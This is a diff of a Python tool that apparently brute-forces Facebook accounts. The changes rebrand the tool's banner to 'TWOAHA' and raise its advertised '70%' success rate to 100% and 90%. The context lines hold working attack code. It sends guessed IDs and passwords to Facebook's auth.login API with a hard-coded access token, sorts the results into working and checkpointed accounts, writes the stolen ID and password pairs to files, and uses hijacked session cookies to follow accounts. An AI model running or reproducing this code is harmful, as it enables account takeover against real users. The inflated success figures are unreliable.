@@ -369,10 +369,10 @@ def free(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗] {idf} * {pw}')
+				print(f'\r\x1b[1;92m [𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-TWOAHA] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗','a').write('%s\n' % wrt)
+				open('/sdcard/𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-TWOAHA','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -440,7 +440,7 @@ class Main:
 			input("\n\033[1;37m TYᑭᗴ Tᕼᗴ Oᗯᑎᗴᖇ ᖴᗩᑕᗴᗷOOK ᗩᑕᑕOᑌᑎT ᑎᗩᗰᗴ \033[1;37m")
 			time.sleep(3.1)
 			print("")
-			print("\033[1;32m ᗯᗴᒪᑕOᗰᗴ TO ••𝗠𝗔𝗝𝗜𝗗•• ᗷᖇᗩᑎᗪ TOOᒪՏ")
+			print("\033[1;32m ᗯᗴᒪᑕOᗰᗴ TO ••TWOAHA•• ᗷᖇᗩᑎᗪ TOOᒪՏ")
 			time.sleep(3.0)
 			os.system("clear")
 		print(logo)
@@ -492,7 +492,7 @@ class Main:
 				print(logo)
 				print("     \033[0;93m   🅟︎🅡︎🅔︎🅜︎🅘︎🅤︎🅜︎  🅜︎🅞︎🅓︎🅔︎  🅐︎🅒︎🅣︎🅘︎🅥︎🅐︎🅣︎🅔︎🅓︎")
 				print("\n\033[0;94m [+] 𝗕𝗿𝘂𝘁𝗲 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗦𝘁𝗮𝗿𝘁𝗲𝗱")
-				print(" \033[0;96m[+] 𝗡𝗼𝘁𝗲 : 70% 𝗖𝗣 𝗮𝗰𝗰𝗼𝘂𝗻𝘁𝘀 𝗼𝗽𝗲𝗻 𝗝𝗨𝗦𝗧 𝗡𝗢𝗪")
+				print(" \033[0;96m[+] 𝗡𝗼𝘁𝗲 : 100% 𝗖𝗣 𝗮𝗰𝗰𝗼𝘂𝗻𝘁𝘀 𝗼𝗽𝗲𝗻 𝗝𝗨𝗦𝗧 𝗡𝗢𝗪")
 				print(" [!] 𝗜𝗙 𝗡𝗢 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 𝗨𝗦𝗘 𝗔𝗜𝗥𝗢𝗣𝗟𝗔𝗡𝗘 𝗠𝗢𝗗𝗘 𝗙𝗢𝗥 10 𝗦𝗘𝗖𝗦")
 				print("\033[0;94m----------------------------------------------")
 				print("\n")
@@ -885,15 +885,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗]%s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-TWOAHA]%s | %s\033[1;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-TWOAHA.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-TWOAHA] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-TWOAHA.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -923,7 +923,7 @@ class Main:
 				print(logo)
 				print("     \033[0;93m   🅟︎🅡︎🅔︎🅜︎🅘︎🅤︎🅜︎  🅜︎🅞︎🅓︎🅔︎  🅐︎🅒︎🅣︎🅘︎🅥︎🅐︎🅣︎🅔︎🅓︎")
 				print("\n\033[0;94m [+] 𝗕𝗿𝘂𝘁𝗲 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗦𝘁𝗮𝗿𝘁𝗲𝗱")
-				print(" \033[0;96m[+] 𝗡𝗼𝘁𝗲 : 70% 𝗖𝗣 𝗔𝗰𝗰𝗼𝘂𝗻𝘁𝘀 𝗢𝗽𝗲𝗻 𝗝𝗨𝗦𝗧 𝗡𝗢𝗪")
+				print(" \033[0;96m[+] 𝗡𝗼𝘁𝗲 : 90% 𝗖𝗣 𝗔𝗰𝗰𝗼𝘂𝗻𝘁𝘀 𝗢𝗽𝗲𝗻 𝗝𝗨𝗦𝗧 𝗡𝗢𝗪")
 				print(" [!] 𝗜𝗙 𝗡𝗢 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 𝗨𝗦𝗘 𝗔𝗜𝗥𝗢𝗣𝗟𝗔𝗡𝗘 𝗠𝗢𝗗𝗘 𝗙𝗢𝗥 10 𝗦𝗘𝗖𝗦")
 				print("\033[0;94m--------------------------------------------")
 				print("\n")
@@ -1316,13 +1316,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗] %s | %s\033[0;32m         "%(uid, pw))
+				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-TWOAHA] %s | %s\033[0;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-TWOAHA.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗠𝗔𝗝𝗜𝗗] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-TWOAHA] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("Successfull.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
